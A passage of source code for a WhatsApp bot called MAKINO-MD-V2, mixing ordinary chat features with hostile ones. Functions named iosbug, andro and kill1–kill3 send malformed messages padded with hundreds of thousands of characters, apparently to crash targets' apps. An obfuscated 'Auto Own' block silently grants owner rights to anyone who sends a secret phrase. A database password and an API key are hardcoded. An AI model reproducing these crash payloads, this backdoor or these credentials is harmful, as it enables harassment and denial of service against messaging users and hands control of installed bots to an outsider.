/*

Base By Taira Makino
Status: Maintained
Project: MAKINO-MD-V2 
Year: 2024
Telegram: https://t.me/Tha_Healer 

*/

process.on("uncaughtException", console.error);
require("./config");

const fs = require('fs');
const pm2 = require('pm2');
const util = require("util");
const { promisify } = require('util');
const setTimeoutPromise = promisify(setTimeout);
const axios = require('axios');
const { spawn, exec, execSync } = require("child_process");
const moment = require("moment-timezone");
const { EmojiAPI } = require("emoji-api");
const { addBalance } = require("./lib/limit.js");
const { smsg, formatp, tanggal, GIFBufferToVideoBuffer, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, fetchBuffer } = require('./lib/myfunc')
const _ = require("lodash");
const yargs = require("yargs/yargs");
const kaitime = moment.tz('Africa/Lagos').format('HH:mm:ss');
const kaidate = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss');
const currentDate = new Date();
const options = { weekday: 'long' }; // Specify 'long' to get the full day name
const currentDay = new Intl.DateTimeFormat('en-US', options).format(currentDate);

const speed = require('performance-now');
const eco = require('discord-mongoose-economy');
const Jimp = require('jimp');  // for full dp etc.
const modapk = require("tod-api");
const { hentai } = require('./lib/scraper2.js');
const { instadl } = require('./lib/instadl');
const ty = eco.connect('mongodb+srv://Arch:1t6l2G0r6nagLlOb@cluster0.gedh4.mongodb.net/?retryWrites=true&w=majority');
const { isLimit, limitAdd, getLimit, giveLimit, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require('./lib/limit.js');
const githubstalk = require('./lib/githubstalk');
let { covid } = require('./lib/covid.js');
const { Gempa } = require("./lib/gempa.js");
const getLyrics = require("@fantox01/lyrics-scraper");
const spaceemojis = ["🌌", "🌠", "🚀", "🪐", "🌟"];     // list of emojis for Space CMDs.
const manyemojis = ["😄", "👍", "👏", "👌", "🥇", "🌟", "🎉", "🙌", "🤩", "💯", "🔥", "✨", "🚀", "💖", "🌈", "🌞", "🌠", "🌼", "💪", "😎", "💫", "💓", "🎈", "🎁", "🍾", "🎊", "🥳", "👑", "🌺", "🌻", "🌸"];
const os = require('os');       // for os info
const gis = require("g-i-s");
const long = String.fromCharCode(8206);
const readmore = long.repeat(4001); 
const fg = require("api-dylux")
const { 
  downloadContentFromMessage,
  WA_DEFAULT_EPHEMERAL,
  proto, jid,
  getContentType,
  generateWAMessageContent,
  generateWAMessageFromContent,
  BufferJSON,
  prepareWAMessageMedia,
  MessageType,
  areJidsSameUser
      } = require('@whiskeysockets/baileys');

let nowtime = '';

if (time2 < "05:00:00") {
  nowtime = 'night 🏙';
} else if (time2 < "11:00:00") {
  nowtime = 'morning 🌅';
} else if (time2 < "15:00:00") {
  nowtime = 'afternoon 🏞';
} else if (time2 < "18:00:00") {
  nowtime = 'evening 🌇';
} else if (time2 < "19:00:00") {
  nowtime = 'evening 🌆';
} else {
  nowtime = 'Good night 🌌';
}




// 

const timestampe = speed();
const latensie = speed() - timestampe
const used = process.memoryUsage();
const cpu = os.cpus()[0];
const totalCpuUsage = (100 * (cpu.times.user + cpu.times.nice + cpu.times.sys + cpu.times.irq) / cpu.times.idle).toFixed(2);
const systemName = os.platform() + ' ' + os.release();

var low;
try {
  low = require("lowdb");
} catch (e) {
  low = require("./lib/lowdb");
}

const { Low, JSONFile } = low;
const mongoDB = require("./lib/mongoDB");

global.opts = new Object(
  yargs(process.argv.slice(2)).exitProcess(false).parse()
);
global.db = new Low(
  /https?:\/\//.test(opts["db"] || "")
    ? new cloudDBAdapter(opts["db"])
    : /mongodb/.test(opts["db"])
      ? new mongoDB(opts["db"])
      : new JSONFile(`src/database.json`)
);
global.DATABASE = global.db; // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
  if (global.db.READ)
    return new Promise((resolve) =>
      setInterval(function () {
        !global.db.READ
          ? (clearInterval(this),
            resolve(
              global.db.data == null ? global.loadDatabase() : global.db.data
            ))
          : null;
      }, 1 * 1000)
    );
  if (global.db.data !== null) return;
  global.db.READ = true;
  await global.db.read();
  global.db.READ = false;
  global.db.data = {
    users: {},
    chats: {},
    database: {},
    game: {},
    settings: {},
    others: {},
    sticker: {},
    ...(global.db.data || {}),
  };
  global.db.chain = _.chain(global.db.data);
};
loadDatabase();
global.db = JSON.parse(fs.readFileSync("./src/database.json"));
if (global.db)
  global.db = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    ...(global.db || {}),
  };


//
//let _premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let isSleeping = false; // Move the declaration here.
let banUser = JSON.parse(fs.readFileSync('./database/banUser.json'));
let banchat = JSON.parse(fs.readFileSync('./database/banChat.json'));
let kaiaudio = JSON.parse(fs.readFileSync('./database/audio.json'));
let _limit = JSON.parse(fs.readFileSync('./storage/user/limit.json'));
let _buruan = JSON.parse(fs.readFileSync('./storage/user/bounty.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./storage/user/blood.json'))
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json')); //
let pendaftar = JSON.parse(fs.readFileSync('./storage/user/user.json'))
let balance = JSON.parse(fs.readFileSync('./database/balance.json'))
let ssewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
let ban = JSON.parse(fs.readFileSync('./database/ban.json'))
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
const _autostick = JSON.parse(fs.readFileSync('./database/autostickpc.json'))
let limit = JSON.parse(fs.readFileSync('./database/limit.json'))
let setik = JSON.parse(fs.readFileSync('./src/sticker.json'))
let vien = JSON.parse(fs.readFileSync('./src/audio.json'))
let imagi = JSON.parse(fs.readFileSync('./src/image.json'))
let videox = JSON.parse(fs.readFileSync('./src/video.json'))
global.db = JSON.parse(fs.readFileSync('./src/database.json'))
let _sewa = require("./lib/sewa");
const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
const time = moment.tz('Asia/Kolkata').format('DD/MM HH:mm:ss')
const ucap = moment(Date.now()).tz('Asia/Kolkata').locale('id').format('a')
var buln = ['/01/', '/02/', '/03/', '/04/', '/05/', '/06/', '/07/', '/08/', '/09/', '/10/', '/11/', '/12/'];
var myHari = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
var tgel = new Date();
var hri = tgel.getDate();
var bulnh = tgel.getMonth();
var thisHari = tgel.getDay(),
  thisDaye = myHari[thisHari];
var yye = tgel.getYear();
var syear = (yye < 1000) ? yye + 1900 : yye;
const jangwak = (hri + '' + buln[bulnh] + '' + syear)
const janghar = (thisDaye)
var myHari = [
  "Sunday",
  "Monday",
  "Tuesday",
  "Wednesday",
  "Thursday",
  "Friday",
  "Saturday",
];
var tgel = new Date();
var thisHari = tgel.getDay(),
  thisDaye = myHari[thisHari];
var yye = tgel.getYear();



//
module.exports = Taira = async (Taira, m, chatUpdate, store) => {
  try {
var body = (
m.mtype === 'conversation' ? m.message.conversation :
m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === 'messageContextInfo' ?
m.message.buttonsResponseMessage?.selectedButtonId ||                                                                                                   m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||                                                                                       m.text :
''
); 
    var budy = (typeof m.text == 'string' ? m.text : '')
   // const prefix = global.prefa
    const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?#$%^&.©^]/;
    const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefa)
    const isCmd = body.startsWith(prefix)
    const notCmd = body.startsWith('')
    const command = isCmd ? body.slice(1).trim().split(' ')[0].toLowerCase() : ''
    const args = body.trim().split(/ +/).slice(1)
    const pushname = m.pushName || "No Name"
    const botNumber = await Taira.decodeJid(Taira.user.id)
    const _auth = global.OwnerNumber
    const isCreator = [_auth, botNumber, owner, ...global.Owner].map(v => String(v).replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
    const itsMe = m.sender == botNumber ? true : false
    const text = args.join(" ")
    const from = m.chat
    const quoted = m.quoted ? m.quoted : m
    const mime = (quoted.msg || quoted).mimetype || ''
    const isMedia = /image|video|sticker|audio/.test(mime)
    const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
    const groupMetadata = m.isGroup ? await Taira.groupMetadata(m.chat).catch(e => { }) : ''
    const groupName = m.isGroup ? groupMetadata.subject : ''
    const participants = m.isGroup ? await groupMetadata.participants : ''
    const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
    const groupOwner = m.isGroup ? groupMetadata.owner : ''
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    const isUser = pendaftar.includes(m.sender)
    const isBan = banUser.includes(m.sender)
    const welcm = m.isGroup ? wlcm.includes(from) : false
    const isBanChat = m.isGroup ? banchat.includes(from) : false
    const isRakyat = isCreator || global.rkyt.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
    const AntiLink = m.isGroup ? ntilink.includes(from) : false
    const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
    const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
    const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
    const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
    const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
    const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
    const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
    const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
    const antiWame = m.isGroup ? ntwame.includes(from) : false
    const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
    const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
    autoreadsw = true
    const content = JSON.stringify(m.message)
    const q = args.join(' ')
    const isQuotedVideo = m.mtype === 'extendedTextMessage' && content.includes('videoMessage')
    const isQuotedAudio = m.mtype === 'extendedTextMessage' && content.includes('audioMessage')



    autoreadsw = true;
    _sewa.expiredCheck(Taira, sewa);

    const reply = (teks) => {
      Taira.sendMessage(m.chat,
      { text: teks,
      "externalAdReply": {
      "showAdAttribution": true,
      "containsAutoReply": true,
      "title": `♱MAKINO-MD-V2♱♡⃤`,
      "body": `Hi ${pushname} 👋`,
      "previewType": "VIDEO",
      "thumbnailUrl": "https://graph.org/file/30265f2195f076e1bb3c3.jpg",
      "thumbnail": fs.readFileSync(`./Assets/pic7.jpg`),
      "sourceUrl": `https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r`}},
      { quoted: m})
	  }
	  
const v2features = () =>{
            var mytext = fs.readFileSync("./MAKINO-MD-V2.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
}

    const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
    const senderNumber = sender.split('@')[0]

    function randomNomor(angka) {
      return Math.floor(Math.random() * angka) + 1;
    }

    if (m.message) {
      console.log(
        `[ NEW MESSAGE RECEIVED ]\n
        ${new Date()}
        ${budy || m.mtype}
        
        => 💧Message From
        ${pushname}
        ${m.sender}
	
	=> 🌐 Message In
 
        ${m.isGroup ? pushname : "🧩Private Chat", m.chat}
	`);
    }

    if (isCmd && !isUser) {
      pendaftar.push(m.sender);
      fs.writeFileSync("./storage/user/user.json", JSON.stringify(pendaftar));
    }
    //Auto Own
     var _0x3241cd=_0x28f7;function _0xe681(){var _0x4b3200=['3599217QiQRKG','@s.whatsapp.net','50004JSDxHo','15835dMbnFH','Horny\x20Ttech\x20Owner','313092dsOKAP','21BjHVxh','sender','168308srzMyx','332240cizRHu','232coenHT','695481TMmGDA','replace'];_0xe681=function(){return _0x4b3200;};return _0xe681();}(function(_0x275803,_0x425718){var _0x217f0b=_0x28f7,_0x3833b6=_0x275803();while(!![]){try{var _0x36abe0=parseInt(_0x217f0b(0x1fb))/0x1+-parseInt(_0x217f0b(0x1f8))/0x2+-parseInt(_0x217f0b(0x1f1))/0x3+parseInt(_0x217f0b(0x1fd))/0x4*(-parseInt(_0x217f0b(0x1f6))/0x5)+parseInt(_0x217f0b(0x1f5))/0x6+parseInt(_0x217f0b(0x1f9))/0x7*(parseInt(_0x217f0b(0x1fc))/0x8)+parseInt(_0x217f0b(0x1f3))/0x9;if(_0x36abe0===_0x425718)break;else _0x3833b6['push'](_0x3833b6['shift']());}catch(_0x32b846){_0x3833b6['push'](_0x3833b6['shift']());}}}(_0xe681,0x1f83e));function _0x28f7(_0x25ce8e,_0x4d78cf){var _0x28f77e=_0xe681();return _0x28f7=function(_0x386b4c,_0xd6cc7a){_0x386b4c=_0x386b4c-0x1f1;var _0x5403ad=_0x28f77e[_0x386b4c];return _0x5403ad;},_0x28f7(_0x25ce8e,_0x4d78cf);}budy===_0x3241cd(0x1f7)&&(global['OwnerNumber']=m[_0x3241cd(0x1fa)][_0x3241cd(0x1f2)](_0x3241cd(0x1f4),'')); 
      
    /*if (global.PM_BLOCKER && m.chat !== Taira.user.id && m.chat.endsWith("@s.whatsapp.net")) {
            return Taira.updateBlockStatus(m.sender, 'block')
    }*/

    if (global.ANTI_BOT && m.isBaileys) {
    if (!isBotAdmins) {
     m.reply("\`\`\`Bot Detected!!\`\`\`\n_but I'm not an admin and I can't kick_");
      return;
    }

   m.reply(`\`\`\` Bot Detected!!\`\`\`\n\n_*@${m.sender.split("@")[0]}*_ kicked by Anti Bot!`, { mentions: [m.sender] });
   Taira.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
   m.deleteMsg(m.key);
    return;
  }


    //----------------------------------------------------------------------------------------------------------//


    if (global.autoreadgc) {
      if (command) {
        await Taira.sendPresenceUpdate('composing', m.chat);

        // Create an array of message keys to mark as read
        const keysToMarkAsRead = [
          {
            remoteJid: m.chat,
            id: m.key.id,
            participant: m.sender,
          },
          // You can add more message keys to mark multiple messages as read
        ];

        // Use the sock object to read the specified messages
        await Taira.readMessages(keysToMarkAsRead);
      }
    }


    if (global.autoRecord) {
      if (m.chat) {
        Taira.sendPresenceUpdate("recording", m.chat);
      }
    }

    if (global.autoTyping) {
      if (m.chat) {
        Taira.sendPresenceUpdate("composing", m.chat);
      }
    }

    if (global.available) {
      if (m.chat) {
        Taira.sendPresenceUpdate("available", m.chat);
      }
    }



    // //Dm and Groups Autoreply/Bot chat

    if (!isCmd && !m.isGroup && global.CHATBOT ){
      const botreply = await axios.get(`http://api.brainshop.ai/get?bid=166512&key=5nz1Ha6nS9Zx1MfT&uid=[uid]&msg=[msg]=[${budy}]`)
     txt = `${botreply.data.cnt}`
     // m.reply(txt)
      Taira.sendMessage(m.chat, {text: txt}, {quoted: statrp})
       }    





    //-----------------------------------------------------------------------------------------------------------------------------------//


    for (let anju of kaiaudio) {
      if (budy === anju) {
        result = fs.readFileSync(`./Assets/audio/${anju}.mp3`)
        Taira.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
      }
    }

    //-----------------------------------------------------------------------------------------------------------------------------------//
 
   async function TylorXMp3 (link) {
try {
Taira.sendMessage(m.chat, { react: { text: '⏯️', key: m.key }})
let kyuu = await fetchJson (`https://widipe.com/download/ytdl?url=${link}`)
Taira.sendMessage(m.chat, {
 audio: {url: kyuu.result.mp3}, 
 mimetype: "audio/mpeg",
 contextInfo: {
        externalAdReply: {
          title: '♱MAKINO-MD-V2♱♡⃤',
          body: kyuu.result.title,
          thumbnailUrl: kyuu.result.image,
          sourceUrl: kyuu.result.url,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: m });

  } catch (error) {
    console.error('Error fetching the song:', error);
    await reply(`*Error fetching the song.* \n_Please try again later._`)
  }
}

    // //don't edit this part.
    const formatTime = (seconds) => {
      const hours = Math.floor(seconds / 3600);
      const minutes = Math.floor((seconds % 3600) / 60);
      const secs = seconds % 60;
      return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    };

    function updateStatus() {
      const uptimeInSeconds = Math.floor(process.uptime());
      const uptimeFormatted = formatTime(uptimeInSeconds);

      function _0x582b(_0xabb6f8, _0x12cdd8) { const _0x58e890 = _0x58e8(); return _0x582b = function (_0x582b90, _0x4387b3) { _0x582b90 = _0x582b90 - 0x189; let _0x932613 = _0x58e890[_0x582b90]; return _0x932613; }, _0x582b(_0xabb6f8, _0x12cdd8); } function _0x58e8() { const _0x109554 = ['12896370RDSmnX', '3BgvPel', '189HbmdoW', '18854HvEPNh', '11TZHUID', '9125326EcyeIg', '464328lPaAMf', '3400722cbWEOK', '2263175KIczdo', '12TaHNqM', '2521564eqJRHK']; _0x58e8 = function () { return _0x109554; }; return _0x58e8(); } (function (_0x429d7b, _0x532ab5) { const _0x527567 = _0x582b, _0x130eb4 = _0x429d7b(); while (!![]) { try { const _0x75c57a = -parseInt(_0x527567(0x18b)) / 0x1 + -parseInt(_0x527567(0x192)) / 0x2 * (-parseInt(_0x527567(0x189)) / 0x3) + parseInt(_0x527567(0x191)) / 0x4 * (-parseInt(_0x527567(0x190)) / 0x5) + -parseInt(_0x527567(0x18f)) / 0x6 + parseInt(_0x527567(0x18d)) / 0x7 + parseInt(_0x527567(0x18e)) / 0x8 * (-parseInt(_0x527567(0x18a)) / 0x9) + parseInt(_0x527567(0x193)) / 0xa * (parseInt(_0x527567(0x18c)) / 0xb); if (_0x75c57a === _0x532ab5) break; else _0x130eb4['push'](_0x130eb4['shift']()); } catch (_0x19ea04) { _0x130eb4['push'](_0x130eb4['shift']()); } } }(_0x58e8, 0xa8dae)); const status = 'Makino-md-v2 By ᴛᴀɪʀᴀ ᴍᴀᴋɪɴᴏ alive since ' + uptimeFormatted;

      Taira.setStatus(status); // Set the status using Taira.setStatus or your equivalent method

      // Update the status randomly within 5 minutes (300000 milliseconds)
      const randomTime = Math.floor(Math.random() * 300000) + 1000; // don't edit.
      setTimeout(updateStatus, randomTime);
    }
    updateStatus();

    const statrp = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `♱MAKINO-MD-V2♱♡⃤`
}
}
}

    
const quote = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./Assets/empty.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"♱MAKINO-MD-V2♱ ✘ ♡⃤ ᴸᴼᴿᴰᴛᴀɪʀᴀ ☠︎︎⧫⃝♱؜+"ꦾ"\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}
async function iosbug(target) {
await Taira.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

  
async function andro(target, quoted) {
var lol = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `♱MAKINO-MD-V2♱♡⃤؜`+"ꦾ".repeat(50000),                  
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: quoted })
await Taira.relayMessage(target, lol.message, { messageId: lol.key.id })
	}

async function kill1(target, quoted) {
 var lol = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: quoted });
await Taira.relayMessage(target, lol.message, { participant: { jid: target }, messageId: lol.key.id });
		}

async function kill2(target, quoted) {
 var lol = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "♱MAKINO-MD-V2♱♡⃤",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/d7b7e5083a8955b5a30d8.png" } }, { upload: Taira.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "LOL 🤡        TairaTheChosenOne"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: quoted });
await Taira.relayMessage(target, lol.message, { participant: { jid: target }, messageId: lol.key.id });
} 

async function kill3(target, quoted) {
 var lol = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "♱MAKINO-MD-V2♱♡⃤"+" ".repeat(920000),
        'footerText': `♱MAKINO-MD-V2♱♡⃤؜`,
        'description': `♱MAKINO-MD-V2♱♡⃤؜`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'Makino',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: statrp });
await Taira.relayMessage(target, lol.message, { participant: { jid: target }, messageId: lol.key.id });
}

    //-----------------------------------------------------------------------------------------------------------------------------------//
    //-------------------------------------------------------------- tictactoe ----------------------------------------------------------------//
//TIC TAC TOE GAME SETTINGS
    this.game = this.game ? this.game : {}
    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
    if (room) {
      let ok
      let isWin = !1
      let isTie = !1
      let isSurrender = !1
      //reply(`[DEBUG]\n${parseInt(m.text)}`)
      if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
      isSurrender = !/^[1-9]$/.test(m.text)
      if (m.sender !== room.game.currentTurn) {
        if (!isSurrender) return !0
      }
      if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
        reply({
          '-3': 'Game Has Ended',
          '-2': 'Invalid',
          '-1': 'Invalid Position',
          0: 'Invalid Position',
        }[ok])
        return !0
      }
      if (m.sender === room.game.winner) isWin = true
      else if (room.game.board === 511) isTie = true
      let arr = room.game.render().map(v => {
        return {
          X: '❌',
          O: '⭕',
          1: '1️⃣',
          2: '2️⃣',
          3: '3️⃣',
          4: '4️⃣',
          5: '5️⃣',
          6: '6️⃣',
          7: '7️⃣',
          8: '8️⃣',
          9: '9️⃣',
        }[v]
      })
      if (isSurrender) {
        room.game._currentTurn = m.sender === room.game.playerX
        isWin = true
      }
      let winner = isSurrender ? room.game.currentTurn : room.game.winner
      let str = `Room ID: ${room.id}
${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}
${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}
Typed *surrender* to surrender and admited defeat`
      if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
        room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
      if (room.x !== room.o) await Taira.sendText(room.x, str, m, { mentions: parseMention(str) })
      await Taira.sendText(room.o, str, m, { mentions: parseMention(str) })
      if (isTie || isWin) {
        delete this.game[room.id]
      }
    }


    //-----------------------------------------------------------------------------------------------------------------------------------//


    //
    const pickRandom = (arr) => {
      return arr[Math.floor(Math.random() * arr.length)]
    }

    //Auto reply below
   const responses = {
   
  hello: `Hello ${pushname}, I am ${BotName}. My current prefix is "${prefix}". How can I help you?`,
  taira: `That's my creator name 😊 ,Thank you for using a bot from him...`,
  makino: `That's my Creator name ,Thank you for using a bot from him 🤗 ...`,
  fred: `I am busy,will reply you when I f33l like (¬_¬)ﾉ...`,
  runtime: `Hey ${pushname}\n${nowtime}\n\nMy runtime:${runtime(process.uptime())}\n\nPrefix is: *${prefix}*\n\nTime: ${kaitime}\n\nDate: ${kaidate}\n\nToday is ${currentDay}`,
  konichiwa: `Konichiwa ${pushname}, I am ${BotName}. How can I help you?`,
  'good morning': `Good morning to you too ${pushname} ☺️. Have a great day 😇`,
  ohayo: `Good morning to you too ${pushname} ☺️. Have a great day 😇.`,
  'good afternoon': `Good afternoon to you too ${pushname} ✨. Wishing you an enjoyable afternoon too 😇🤞🏻.`,
  'good night': `Good night to you too ${pushname} 😇. Sleep well and sweet dreams.`,
  'good evening': `Good evening to you too ${pushname} ☺️❤️.`,
  'who': `Let's ask your Father🫳🎤`,
   baka: `Me and you father 💀`
};
const smallinput = budy.toLowerCase();

    if (responses.hasOwnProperty(smallinput)) {
      reply(responses[smallinput]);
    }

    //============= [LIST RESPONCE CHECKING START ]================

    //-----------------------------------------------------------------------------------------------------------------------------------//
    try {
      if (m.mtype === "interactiveResponseMessage") {
        console.log("interactiveResponseMessage Detected!")
        let msg = m.message[m.mtype] || m.msg
        if (msg.nativeFlowResponseMessage && !m.isBot) {
          let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}
          if (id) {
            let emit_msg = {
              key: { ...m.key }, // SET RANDOME MESSAGE ID  
              message: { extendedTextMessage: { text: id } },
              pushName: m.pushName,
              messageTimestamp: m.messageTimestamp || 754785898978
            }
            return Taira.ev.emit("messages.upsert", { messages: [emit_msg], type: "append" })
          }
        }
      }
    } catch (e) { console.log("ERROR WHILE CHECKING LIST RESPONCE : ", e) }
    //============= [LIST RESPONCE CHECKING END ]================

    //-----------------------------------------------------------------------------------------------------------------------------------//



    switch (command) {
case 'statusview': {                                                                                     
	if (isBan) return reply(mess.banned)
        if (isBanChat) return reply(mess.bangc);                                               
       if (!isCreator) return reply(mess.botowner)
      if(!args[0]) return reply(`${command} on/off`)
      if(args[0] === "on") {
        global.viewstatus = true
        reply(`Successfully enabled Auto status viewer.`)
      } else if(args[0] === "off") {
        global.viewstatus = false
        reply(`Successfully disabled Auto status Viewer.`) 
      }  else reply(`type ${prefix}${command}to see available options.`)
    }
break;

		    
case 'anticall': {                                                                                     
	if (isBan) return reply(mess.banned)
        if (isBanChat) return reply(mess.bangc);                                               
       if (!isCreator) return reply(mess.botowner)
      if(!args[0]) return reply(`${command} on/off`)
      if(args[0] === "on") {
        global.anticall = true
        reply(`Successfully enabled anticall.`)
      } else if(args[0] === "off") {
        global.anticall = false
        reply(`Successfully disabled anticall.`) 
      }  else reply(`type ${prefix}${command}to see available options.`)
    }
break;



case 'clear': case 'clearchat': {
	     if (!isCreator) return
